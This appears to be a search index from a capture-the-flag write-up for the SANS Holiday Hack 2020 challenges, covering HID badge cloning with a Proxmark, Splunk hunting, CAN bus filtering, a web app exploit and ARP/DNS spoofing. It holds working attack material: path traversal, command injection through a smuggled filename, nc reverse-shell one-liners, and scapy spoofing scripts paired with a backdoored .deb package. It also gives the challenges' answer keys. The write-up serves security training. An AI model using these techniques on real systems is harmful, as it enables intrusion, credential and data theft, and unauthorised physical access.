Santa what the hell is this I hear another Santa in my head You can now roam around as Santa and use the elevator to get to Santa's Office. This also unlocks a whole new set of narratives between Santa and the other NPCs, like the conference booths . Things are starting to make a little more sense now. It appears that Jack Frost has been impersonating Santa and causing all kinds of trouble!","title":"Open HID Lock"},{"location":"objectives/o5/#open-hid-lock","text":"Difficulty : Direct link : proxmark terminal Terminal hint : Speaker UNPrep and 33.6kbps","title":"Open HID Lock"},{"location":"objectives/o5/#objective","text":"Request Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Bushy Evergreen Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you! Fitzy Shortstack You know, Santa really seems to trust Shinny Upatree...","title":"Objective"},{"location":"objectives/o5/#hints","text":"Reading Badges with Proxmark You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. Impersonating Badges with Proxmark You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. `lf hid sim -r 2006...... What's a Proxmark? The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. Short List of Essential Proxmark Commands There's a short list of essential Proxmark commands also available. Proxmark Talk Larry Pesce knows a thing or two about HID attacks . He's the author of a course on wireless hacking!","title":"Hints"},{"location":"objectives/o5/#solution","text":"To solve this challenge we need to find a Proxmark device, roam around Santa's castle to scan NPC badges, and use the collected information to open the HID lock in the workshop. The Proxmark device can be found next to the table in the Wrapping Room and after picking it up you'll be able to access the Proxmark CLI via the item list on your conference badge. As per Bushy Evergreen's hint we can either go around scanning all the NPC badges or we can scan just a few and then fill in the blanks. As Larry Pesce mentions in his HID attacks HID cards are often sold with sequential ID numbers. So all we really need is just enough information to determine that sequence. To scan a badge, stand next to an NPC, open the Proxmark CLI and type lf search or lf hid read . If the NPC has a badge these commands will return the HID card information such as the facility code (FC), and the card ID. Walking around the castle we can compile the following list of badge IDs. NPC name Wiegand Facility code ID Sparkle Redberry 2006e22f0d 113 6022 Shinny Upatree 2006e22f13 113 6025 Holly Evergreen 2006e22f10 113 6024 Noel Boetie (old) 2006e22f08 113 6020 Noel Boetie (new) 2006e22ee1 113 6000 Bow Ninecandle 2006e22f0e 113 6023 Noel Boetie's new badge It appears that Noel was issued a replacement badge during the event. When first scanning Noel Boetie's badge his ID number was 6020. As noted previously, there is no need to scan all of the badges in the above table. If you happen to scan Noel Boetie's old badge and Shinny Upatree's badge it'd be clear that the most likely badge ID sequence is 6020 to 6025. Now that we have some badge ID values we can head back to the Workshop Room. Stand next to the HID lock, open the Proxmark CLI, and simulate a badge using its Wiegand value. For example, to simulate Sparkle Redberry's badge use lf hid sim -r 2006e22f0d . Alternatively, if you're extrapolating badge IDs based on collected information, you can use lf hid sim -w H10301 --fc 113 --cn 6024 to simulate Holly Evergreen's badge. Simply iterate over all badge IDs until the door unlocks. If you've already solved the 33.6kbps terminal hint then Fitzy Shortstack will have told you that Santa really seems to trust Shinny Upatree which confirms our solution. Shinny Upatree's badge is indeed the one that opens the door. Answer Use lf hid sim -r 2006e22f13 or lf hid sim -w H10301 --fc 113 --cn 6025 to unlock the door using Shinny Upatree's badge information.","title":"Solution"},{"location":"objectives/o5/#being-santa-claus","text":"Walk to the end of the dark hallway. The two lights at the end are peephole cutouts for the eyes in the portrait hanging behind Santa in the Entryway. If you move forward towards the light you will end up in Santa's body. This is a direct reference to the movie Being John Malkovich and is explained in more detail in the Easter Egg section. It's also where the idea for this image came from. Santa what the hell is this I hear another Santa in my head You can now roam around as Santa and use the elevator to get to Santa's Office. This also unlocks a whole new set of narratives between Santa and the other NPCs, like the conference booths . Things are starting to make a little more sense now. It appears that Jack Frost has been impersonating Santa and causing all kinds of trouble!","title":"Being Santa Claus"},{"location":"objectives/o6/","text":"Splunk Challenge \u2693\ufe0e Difficulty : Direct link : kringleconsoc website Terminal hint : Sort-o-Matic Objective \u2693\ufe0e Request Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Angel Candysalt Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up. Hints \u2693\ufe0e Adversary Emulation and Splunk Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk . Splunk Basics There was a great Splunk talk at KringleCon 2 that's still available! Data Decoding and Investigation Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here! Solution \u2693\ufe0e Alice Bluebird Ok elves! Like Santa said, I simulated a bunch of ATT&CK techniques/sub-techniques and stored the results from each run in its own dedicated set of Splunk indexes. Check out the Splunk Search Interface to get started answering Training Question 1. Training question 1 Question How many distinct MITRE ATT&CK techniques did Alice emulate? Alice Bluebird I stored every simulation in its own index so you can just use a Splunk search like | tstats count where index=* by index for starters! I expect some of the elves in the SOC to confuse techniques with sub-techniques. Use the proposed | tstats count where index=* by index Splunk query and add query logic to grab the first 5 character from the index field and store it in a technique variable, remove any values which don't start with a 't', and finally drop any duplicates. The Statistics header will show the total result count. 1 2 3 4 | tstats count where index=* by index | eval technique=substr(index,0, 5) | search technique=t* | dedup technique Answer 13 Training question 2 Question What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) Alice Bluebird The search I used was: | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique) Training question 2 is almost too easy, especially if they use that search I just shared. I just really want those elves to understand what a Splunk index is, though. I'd expect them to Google it, but had to point a few of them to this definition . Similar to the previous question. Search for all index names beginning with t1059.003 and sort the results alphabetically. 1 2 3 | tstats count where index=* by index | search index=t1059.003* | sort index Answer t1059.003-main t1059.003-win Training question 3 Question One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? Alice Bluebird Now we can talk about some interesting stuff. What's actually in those emulation indexes! I'm assuming they watched the Splunk KringleCon talk and picked up on how to search MITRE's site, and that they should check out the atomics for that technique in the Atomic Red Team github repo. I want them to be comfortable searching in places like Atomic Red Team Answering this question doesn't require a Splunk query and is all about searching MITRE ATT&CK Techniques and Atomic Red Team Atomics resources. A seach for system information discovery on the MITRE ATT&CK website yields technique ID T1082. The atomics page for MITRE ATT&CK technique T1082 lists the registry key near the bottom of the page. Answer HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Training question 4 Question According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) Alice Bluebird Those folks over at Red Canary sure do like using OSTAP in their atomics, don't they? I suppose the SOC elves might overthink this one. Splunk Attack Range keeps track of the simulations that are run in index=attack You can then search that index for specific keywords... All we need to do is search for OSTAP across the whole attack index and sort the results by timestamp. 1 2 3 index=attack | search \"OSTAP\" | sort \"Execution Time _UTC\" Answer 2020-11-30T17:44:15Z Training question 5 Question One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? Alice Bluebird Oh this was a fun one. It takes a bit of pivoting... Start by searching GitHub for frgnca which leads to the frgnca/AudioDeviceCmdlets repository. Next, search for AudioDeviceCmdlets in the Atomic Red Team repository which leads to T1123.md . Finally, search all Splunk indexes beginning with T1123 for process creation events (i.e., Sysmon Event ID 1 ) containing the string WindowsAudioDevice-Powershell-Cmdlet . The parent PowerShell process with PID 3648 matches the first use of the component. 1 2 3 index=T1123* | search EventCode=1 | search *WindowsAudioDevice-Powershell-Cmdlet* Answer 3648 Training question 6 Question Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? T1547.001 contains information related to Registry Run Keys / Startup Folder . Search all indexes beginning with T1547.001 for process command lines matching *.bat* . One entry contains a PowerShell download of https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat . 1 2 3 index=T1547.001* | search CommandLine=*.bat* | sort _time Download Discovery.bat to find the final command. Answer quser Training question 7 Question According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? Alice Bluebird I did not know if I should leave this one in here because it uses the old name for Zeek! In the meantime, I wanted them to look at something like index=* sourcetype=bro* and check out the SSL/TLS certs that are captured in the x509-related sourcetype. Execute the search query provided by Alice and use the fields to the left of the search results to filter on certificate.subject , which is the most likely certificate field to contain a full hostname. Select the entry matching the Windows Domain Controller (i.e. win-dc ) in the attack range (i.e., attackrange.local ). 1 2 index=* sourcetype=bro* \"certificate.subject\"=\"CN=win-dc-748.attackrange.local\" Expand any of the search results to find the certificate.serial field. Answer 55FCEEBB21270D9249E86F4B9DC7AA60 Challenge question Question What is the name of the adversary group that Santa feared would attack KringleCon? Alice Bluebird This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one! Dave Herrald's Adversary Emulation and Automation talk hints at Santa's favorite phrase supposedly being Stay Frosty . Although, we now know that's most likely because Jack Frost has been walking around pretending to be Santa. RFC 7465 or Prohibiting RC4 Cipher Suites tells us which cipher was used to encrypt the information. Use Cyber Chef to decode the BASE64-encoded string (1) and run the output (2) through an RC4 recipe with Stay Frosty as the passphrase (3). Answer The Lollipop Guild","title":"Splunk Challenge"},{"location":"objectives/o6/#splunk-challenge","text":"Difficulty : Direct link : kringleconsoc website Terminal hint : Sort-o-Matic","title":"Splunk Challenge"},{"location":"objectives/o6/#objective","text":"Request Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Angel Candysalt Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up.","title":"Objective"},{"location":"objectives/o6/#hints","text":"Adversary Emulation and Splunk Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk . Splunk Basics There was a great Splunk talk at KringleCon 2 that's still available! Data Decoding and Investigation Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here!","title":"Hints"},{"location":"objectives/o6/#solution","text":"Alice Bluebird Ok elves! Like Santa said, I simulated a bunch of ATT&CK techniques/sub-techniques and stored the results from each run in its own dedicated set of Splunk indexes. Check out the Splunk Search Interface to get started answering Training Question 1.","title":"Solution"},{"location":"objectives/o7/","text":"Solve the Sleigh's CAN-D-BUS Problem \u2693\ufe0e Difficulty : Direct link : candbus website Terminal hint : CAN-Bus Investigation Objective \u2693\ufe0e Request Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Wunorse Openslae Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. Hints \u2693\ufe0e CAN ID Codes Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What's up with the brakes and doors? Solution \u2693\ufe0e Solving this challenge requires a bit of trial and error. A good approach is to start with blocking everything, unblock one ID at a time, and see how each of the sleigh's controls influences the CAN-D bus ID codes and message values. Wunorse Openslae told us that The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. , so we probably want to focus on those parts in particular. By gradually testing each component you can build a table with CAN-D bus ID codes and message values. Sleigh control CAN-D bus ID Message value Start 02A 00FF00 Stop 02A 0000FF Lock 19B 000000000000 Unlock 19B 00000F000000 Steering 019 FFFFFFCD to 00000032 Brake 080 000000 to 000064 Accelerator 244 0000000000 to 0000002379 Unknwown 188 00000000 The Lock and Unlock buttons should generate 2 message values for ID 19B . However, when you filter out everything except for ID 19B you'll notice that out of nowhere additional 0000000F2057 message values appear on the CAN-D bus. We can't have anything happen with the sleigh doors at high altitudes so those need to be filtered out using 19B Equals 0000000F2057 . The second issue is that, when we pump the brakes, spurious negative message values appear on the CAN-D bus for ID 080 . Either you keep your foot off the brakes and the message value is 000000 or you press the brakes and the value gradually goes up to 000064 . Negative values don't make sense, so we filter those out by adding 080 Less 000000000000 . Once both exclusions are in place a Sleigh deFrosted! message appears, indicating success. Answer 080 Less 000000000000 19B Equals 0000000F2057","title":"CAN-D-BUS Problem"},{"location":"objectives/o7/#solve-the-sleighs-can-d-bus-problem","text":"Difficulty : Direct link : candbus website Terminal hint : CAN-Bus Investigation","title":"Solve the Sleigh's CAN-D-BUS Problem"},{"location":"objectives/o7/#objective","text":"Request Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Wunorse Openslae Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes.","title":"Objective"},{"location":"objectives/o7/#hints","text":"CAN ID Codes Try filtering out one CAN-ID at a time and create a table of what each might pertain to. What's up with the brakes and doors?","title":"Hints"},{"location":"objectives/o7/#solution","text":"Solving this challenge requires a bit of trial and error. A good approach is to start with blocking everything, unblock one ID at a time, and see how each of the sleigh's controls influences the CAN-D bus ID codes and message values. Wunorse Openslae told us that The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. , so we probably want to focus on those parts in particular. By gradually testing each component you can build a table with CAN-D bus ID codes and message values. Sleigh control CAN-D bus ID Message value Start 02A 00FF00 Stop 02A 0000FF Lock 19B 000000000000 Unlock 19B 00000F000000 Steering 019 FFFFFFCD to 00000032 Brake 080 000000 to 000064 Accelerator 244 0000000000 to 0000002379 Unknwown 188 00000000 The Lock and Unlock buttons should generate 2 message values for ID 19B . However, when you filter out everything except for ID 19B you'll notice that out of nowhere additional 0000000F2057 message values appear on the CAN-D bus. We can't have anything happen with the sleigh doors at high altitudes so those need to be filtered out using 19B Equals 0000000F2057 . The second issue is that, when we pump the brakes, spurious negative message values appear on the CAN-D bus for ID 080 . Either you keep your foot off the brakes and the message value is 000000 or you press the brakes and the value gradually goes up to 000064 . Negative values don't make sense, so we filter those out by adding 080 Less 000000000000 . Once both exclusions are in place a Sleigh deFrosted! message appears, indicating success. Answer 080 Less 000000000000 19B Equals 0000000F2057","title":"Solution"},{"location":"objectives/o8/","text":"Broken Tag Generator \u2693\ufe0e Difficulty : Direct link : tag-generator website Terminal hint : Redis Bug Hunt Objective \u2693\ufe0e Request Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Noel Boetie Welcome to the Wrapping Room, Santa! The tag generator is acting up. I feel like the issue has something to do with weird files being uploaded. Can you help me figure out what's wrong? Hints \u2693\ufe0e Patience and Timing Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output! Source Code Analysis I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? Endpoint Exploration Is there an endpoint that will print arbitrary files? Content-Type Gotcha If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! Error Page Message Disclosure Can you figure out the path to the script? It's probably on error pages! Download File Mechanism Once you know the path to the file, we need a way to download it! Source Code Retrieval We might be able to find the problem if we can get source code! Redirect to Download If you find a way to execute code blindly, I bet you can redirect to a file then download that file! Solution \u2693\ufe0e Quick 'n dirty or reverse shell? You can either solve this with minimal effort or you can go for a reverse shell. We'll explore both options! Short solution Start by analyzing the app.js JavaScript code. After a successful file upload the uploaded image will be accessible via the /image?id= endpoint with id being a randomly generated value that identifies the image (line 7). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 success : function ( data ) { $ ( '.uploadForm' )[ 0 ]. reset (); $ ( '[for=file-1] span' ). text ( 'Select file(s)' ); setTimeout (() => { data . forEach ( id => { var img = $ ( '<img id=\"dynamic\">' ); img . attr ( 'src' , `/image?id= ${ id } ` ); img . on ( 'load' , () => { const imgElement = img [ 0 ]; var imgInstance = new fabric . Image ( imgElement , { left : ( canvas . width - imgElement . width ) / 2 , top : ( canvas . height - imgElement . height ) / 2 , angle : 0 , opacity : 1 }); canvas . add ( imgInstance ); }); }); }, 500 ); }, The /image?id= endpoint appears to be vulnerable to a path traversal attack , allowing us to read files on the remote system. Since the objective is to read the value of an environment variable and pretty much everything on Linux is considered a file, a request to /image?id=../../../proc/1/environ will return the information we need in the HTTP response, including GREETZ . Longer solution An HTTP request using an invalid id will result in a 404 error response with a message stating Error in /app/lib/app.rb: Route not found . This tells us the location of the backend Ruby on Rails source code file. Tricking web browsers using X-Content-Type-Options: nosniff The X-Content-Type-Options: nosniff header in the HTTP response message prevents web browsers from doing MIME-type sniffing. The web browser will take whatever is set as the Content-Type and assume that information is correct. In this case, the HTTP response tells the browser the data is an image/jpg file which the browser fails to render. As a result, using an invalid id in a web browser will display an image rendering error instead. The image \u201chttps://tag-generator.kringlecastle.com/image?id=somethingsomething%20test\u201d cannot be displayed because it contains errors. We can leverage the same path traversal attack as before by issuing a request to https://tag-generator.kringlecastle.com/image?id=../../../app/lib/app.rb to download app.rb . Because the backend code does not filter the filename variable prior to using it in the system call, we can leverage this flaw to execute our own code (line 7). 1 2 3 4 5 6 7 8 9 10 11 12 def handle_image ( filename ) out_filename = \" #{ SecureRandom . uuid }#{ File . extname ( filename ) . downcase } \" out_path = \" #{ FINAL_FOLDER } / #{ out_filename } \" # Resize and compress in the background Thread . new do if ! system ( \"convert -resize 800x600 \\\\ > -quality 75 ' #{ filename } ' ' #{ out_path } '\" ) LOGGER . error ( \"Something went wrong with file conversion: #{ filename } \" ) else LOGGER . debug ( \"File successfully converted: #{ filename } \" ) end end Structuring the filename of the uploaded file as myfile';command_to_run;ls '.png will translate the convert command into convert -resize 800x600\\\\> -quality 75 'myfile'; , command_to_run; , and ls '.png' '#{ out_path }' . Nudging our own command neatly in the middle. The process_file() function tells us the app allows uploading files with an extension matching either .jpg , .jpeg , .png , or .zip . To prevent our uploaded file from being renamed at the server side we can leverage the handle_zip() function as it leaves filenames as-is after unpacking the uploaded archive (line 7). Luckily for us, Jack also commented out the filename validation code (line 2). Thanks, Jack! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # I wonder what this will do? --Jack # if entry.name !~ /^[a-zA-Z0-9._-]+$/ # raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen' # end # We want to extract into TMP_FOLDER out_file = \" #{ TMP_FOLDER } / #{ entry . name } \" # Extract to file or directory based on name in the archive entry . extract ( out_file ) { # If the file exists, simply overwrite true } # Process it out_files << process_file ( out_file ) To retrieve the value of the GREETZ environment variable, create an image file named myfile';echo $GREETZ>the_GREETZ_tag.txt;ls '.png , add it to a ZIP file , and upload it using the tag generator application. The application will unpack the archive, execute our command, and save the output to /tmp/the_GREETZ_tag.txt which we can then download using a request to https://tag-generator.kringlecastle.com/image?id=../../../tmp/the_GREETZ_tag.txt . Answer JackFrostWasHere Reverse shell A request to https://tag-generator.kringlecastle.com/image?id=../../../bin/nc confirms that netcat is available so we can leverage the code execution vulnerability to establish a reverse shell with full interactive access. The command we need to run on the host is nc 1.2.3.4 55100 -e /usr/bin/sh , but forward slashes are not an option as they're not allowed in a file name. We can work around this limitation by using `which sh` to ask the system what the full path for the sh binary is, instead of specifying it as part of the filename. The image filename now becomes myfile';nc 1.2.3.4 55100 -e `which sh`;ls '.png . Set up a local listener using nc -nlvp 55100 , upload the zipped image file , and wait for the reverse shell connection to be established.","title":"Broken Tag Generator"},{"location":"objectives/o8/#broken-tag-generator","text":"Difficulty : Direct link : tag-generator website Terminal hint : Redis Bug Hunt","title":"Broken Tag Generator"},{"location":"objectives/o8/#objective","text":"Request Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Noel Boetie Welcome to the Wrapping Room, Santa! The tag generator is acting up. I feel like the issue has something to do with weird files being uploaded. Can you help me figure out what's wrong?","title":"Objective"},{"location":"objectives/o8/#hints","text":"Patience and Timing Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output! Source Code Analysis I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? Endpoint Exploration Is there an endpoint that will print arbitrary files? Content-Type Gotcha If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! Error Page Message Disclosure Can you figure out the path to the script? It's probably on error pages! Download File Mechanism Once you know the path to the file, we need a way to download it! Source Code Retrieval We might be able to find the problem if we can get source code! Redirect to Download If you find a way to execute code blindly, I bet you can redirect to a file then download that file!","title":"Hints"},{"location":"objectives/o8/#solution","text":"Quick 'n dirty or reverse shell? You can either solve this with minimal effort or you can go for a reverse shell. We'll explore both options!","title":"Solution"},{"location":"objectives/o9/","text":"ARP Shenanigans \u2693\ufe0e Difficulty : Direct link : santamode-arp terminal Terminal hint : Scapy Prepper Objective \u2693\ufe0e Request Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . Who recused herself from the vote described on the document? Alabaster Snowball It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa. Hints \u2693\ufe0e Sniffy Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. Embedy The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file Resolvy Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP. Spoofy The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts . Solution \u2693\ufe0e Solving this challenge requires intercepting the network traffic coming from Jack's computer to trick the device into downloading a malicious .deb package installer containing a reverse shell back to our host. Python scripts (to help with intercepting the ARP and DNS requests) and sample .deb packages are provided but they're missing some key components. Spoof the ARP response Start by running a packet capture to verify the traffic being received. Update the provided arp_resp.py script so it sends back an ARP response that tricks Jack's machine into thinking we are host 10.6.6.53. We do that by crafting an ARP response packet that has all field values filled out as they normally would, except for the source MAC address fields. Those should contain our MAC address instead (lines 2 and 11). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 if ARP in packet and packet [ ARP ] . op == 1 : ether_resp = Ether ( dst = packet [ ARP ] . hwsrc , type = 0x0806 , src = macaddr ) arp_response = ARP ( pdst = packet [ ARP ] . psrc ) arp_response . op = 2 arp_response . plen = 4 arp_response . hwlen = 6 arp_response . ptype = 0x0800 arp_response . hwtype = 0x01 arp_response . hwsrc = macaddr # we need to make it look as if this came from the original host, not us! arp_response . psrc = packet [ ARP ] . pdst arp_response . hwdst = packet [ ARP ] . hwsrc arp_response . pdst = packet [ ARP ] . psrc Sample ARP pcap files Sample ARP packet captures can be found in ~/pcaps/arp.pcap and on cloudshark.org . Start a new packet capture and run the updated arp_resp.py script. We successfully tricked Jack's machine into sending a DNS request for ftp.osuosl.org our way. Spoof the DNS response Next, craft a DNS response to trick Jack's hijacked machine into thinking ftp.osuosl.org is actually our host. In other words, force the DNS request for ftp.osuosl.org to resolve to our IP address. Update the provided dns_resp.py script by changing ipaddr_we_arp_spoofed to 10.6.6.53 and add the missing DNS details to the handle_dns_request() function. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 def handle_dns_request ( packet ): eth = Ether ( src = macaddr , dst = packet [ Ether ] . src ) ip = IP ( dst = packet [ IP ] . src , src = ipaddr_we_arp_spoofed ) udp = UDP ( dport = packet [ UDP ] . sport , sport = packet [ UDP ] . dport ) # swap ports dns = DNS ( id = packet [ DNS ] . id , qr = 1 , opcode = packet [ DNS ] . opcode , aa = 1 , qdcount = packet [ DNS ] . qdcount , ancount = 1 , qd = DNSQR ( qname = packet [ DNS ] . qd . qname , qtype = packet [ DNS ] . qd . qtype , qclass = packet [ DNS ] . qd . qclass ), an = DNSRR ( rrname = packet [ DNS ] . qd . qname , rdata = ipaddr , ttl = 86400 ) ) dns_response = eth / ip / udp / dns sendp ( dns_response , iface = \"eth0\" ) Sample DNS pcap files Sample DNS packet captures can be found in ~/pcaps/dns.pcap and on cloudshark.org . Start a packet capture and run the updated dns_resp.py script, followed by the arp_resp.py script. Besides the ARP and DNS requests (and our spoofed responses), we're now capturing even more traffic from Jack's machine. Running a simple Python web server using python3 -m http.server 80 will tell us that Jack's hijacked machine is making a failed HTTP GET request to /pub/jfrost/backdoor/suriv_amd64.deb . Let's host a malicious payload there. Create the payload The best package candidate in ~/debs/ is probably netcat-traditional_1.10-41.1ubuntu1_amd64.deb as it will install the nc binary we need to establish the reverse shell connection back to our machine. It also provides a postinst file where we can add the reverse shell command itself to make it execute as part of the package post-install phase. To help remove some of the tedious packaging and setup work create a prepare_package.sh script that unpacks netcat-traditional_1.10-41.1ubuntu1_amd64.deb (lines 9-13), adds the nc reverse shell command to the postinst file (line 18), packages everything back up (line 20), creates the proper directory structure for the HTTP request to succeed (line 22), and start a Python web server to host the .deb file (line 27). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/bash # Start at the right place cd $HOME /debs/ # Unpack the deb package components export MYDEB = netcat-traditional_1.10-41.1ubuntu1_amd64.deb mkdir packing cd packing cp ../ $MYDEB . dpkg -x $MYDEB work mkdir -p work/DEBIAN ar -x $MYDEB tar -xf control.tar.xz ./control tar -xf control.tar.xz ./postinst mv control work/DEBIAN/ mv postinst work/DEBIAN/ # Add the reverse shell command to postinst export my_ip = ` hostname -I ` echo \"/bin/nc ${ my_ip } 8888 -e /bin/bash\" >> work/DEBIAN/postinst # Build the package dpkg-deb --build work/ # Create the path the rogue host is requesting mkdir -p $HOME /web/pub/jfrost/backdoor/ # Move the malicious package file into place mv work.deb $HOME /web/pub/jfrost/backdoor/suriv_amd64.deb # Start the web server cd $home /web/ python3 -m http.server 80 Run the exploit Now that all the required components are in place, open 3 additional Tmux windows (for a total of 4). One window should already be running the Python webserver. Use the remaining 3 windows to first start a netcat listener with nc -nlvp 8888 that will accept the incoming reverse shell connection, then the updated dns_resp.py script, and finally the modified arp_resp.py script. The hijacked host will be redirected to our web server, download the malicious suriv_amd64.deb file, install it, and open a reverse shell as part of the .deb package post-install process. We now have access to the meeting minutes located at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt ... RESOLUTIONS: The board took up final discussions of the plans presented last year for the expansion of Santa\u2019s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle. Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, \u201cThese changes will put a heavy toll on the infrastructure of the North Pole.\u201d Mr. Krampus replied, \u201cThe infrastructure has already been expanded to handle it quite easily.\u201d Chairman Frost then noted, \u201cBut the additional traffic will be a burden on local residents.\u201d Dolly explained traffic projections were all in alignment with existing roadways. Chairman Frost then exclaimed, \u201cBut with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as \u2018The Frostiest Place on Earth?\u2019\u201d Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board. Mrs. Nature made a motion to approve. Seconded by Mr. Cornelius. Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life. ... Answer Tanta Kringle","title":"ARP Shenanigans"},{"location":"objectives/o9/#arp-shenanigans","text":"Difficulty : Direct link : santamode-arp terminal Terminal hint : Scapy Prepper","title":"ARP Shenanigans"},{"location":"objectives/o9/#objective","text":"Request Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . Who recused herself from the vote described on the document? Alabaster Snowball It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa.","title":"Objective"},{"location":"objectives/o9/#hints","text":"Sniffy Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. Embedy The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file Resolvy Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP. Spoofy The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts .","title":"Hints"},{"location":"objectives/o9/#solution","text":"Solving this challenge requires intercepting the network traffic coming from Jack's computer to trick the device into downloading a malicious .deb package installer containing a reverse shell back to our host. Python scripts (to help with intercepting the ARP and DNS requests) and sample .deb packages are provided but they're missing some key components.","title":"Solution"}]}